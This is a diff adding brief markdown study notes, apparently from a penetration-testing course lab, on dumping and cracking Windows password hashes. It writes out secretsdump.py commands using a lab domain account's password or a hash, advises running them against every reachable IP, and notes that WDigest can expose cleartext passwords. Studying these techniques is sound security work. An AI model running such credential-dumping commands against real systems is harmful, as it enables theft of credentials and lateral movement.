@@ -1,0 +1,11 @@
+# Dumping and Cracking Hashes
+
+- Secrets Dump
+    - [secretsdump.py](http://secretsdump.py) MARVEL.local/fcastle:’Password1’@192.168.43.135 (users ip)
+    - With hash
+        - [secretsdump.py](http://secretsdump.py) <username>@<target_ip> -hashes <hash>
+    - Run against all ips you have access to
+- WDigest
+    - runs by default on Windows 7, 8, 2008, 2012 server
+    - got patched
+    - shows password in cleartext
